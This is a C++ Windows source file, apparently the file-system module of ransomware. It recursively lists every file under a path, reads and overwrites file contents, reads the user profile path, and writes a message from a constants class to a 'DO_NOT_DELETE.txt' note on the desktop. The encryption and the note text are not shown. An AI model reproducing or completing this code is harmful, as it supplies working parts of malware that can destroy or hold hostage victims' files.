#include "FileSys.h"
#include <fstream>
#include <vector>
#include <filesystem>
#include <ShlObj.h>
#include "Constants.h"

std::string STR_MESSAGE_PATH;
std::string STR_USERPROFILE;

void FileSys::FUNC_GET_DESKTOP_FOR_USER()
{
    char        C_BUFF[MAX_PATH];
    std::string STR_NOTEPATH;

    SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, C_BUFF);
    STR_NOTEPATH = C_BUFF;
    STR_NOTEPATH += "\\DO_NOT_DELETE.txt";
    STR_MESSAGE_PATH = STR_NOTEPATH;
}

void FileSys::FUNC_GET_USERPROFILE()
{
    STR_USERPROFILE = std::getenv("USERPROFILE");
}

std::vector<std::string> FileSys::FUNC_GET_FILE_LISTING(std::string STR_FPATH)
{
    std::vector<std::string> VEC_FILES;
    std::string STR_BUFF;

    for (const auto& AUT_ENTRY : std::filesystem::recursive_directory_iterator(STR_FPATH))
    {
        try {
            STR_BUFF = AUT_ENTRY.path().u8string();
            VEC_FILES.push_back(STR_BUFF);
        }
        catch (...) {}
    }
    return VEC_FILES;
}

std::string FileSys::FUNC_GET_FILE_CONTENT(std::string STR_FILE)
{
    std::ifstream   STREAM_IFS(STR_FILE);
    std::string     STR_CONTENT = "";

    STR_CONTENT.assign(std::istreambuf_iterator<char>(STREAM_IFS), (std::istreambuf_iterator<char>()));
    STREAM_IFS.close();

    return STR_CONTENT;
}

void FileSys::FUNC_SET_FILE_CONTENT(std::string STR_FILE, std::string STR_CONTENT)
{
    std::fstream FS_FILE;
    FS_FILE.open(STR_FILE, std::ios::out);
    FS_FILE << STR_CONTENT;
    FS_FILE.close();
}

void FileSys::FUNC_CREATE_MESSAGE()
{
    Constants   CL_CONST;
    FUNC_SET_FILE_CONTENT(STR_MESSAGE_PATH, CL_CONST.STR_MESSAGE);
}

bool FileSys::FUNC_FILE_EXISTS(std::string STR_FILE)
{
    std::filesystem::path PTH_FILE{ STR_FILE };
    return std::filesystem::exists(PTH_FILE);
}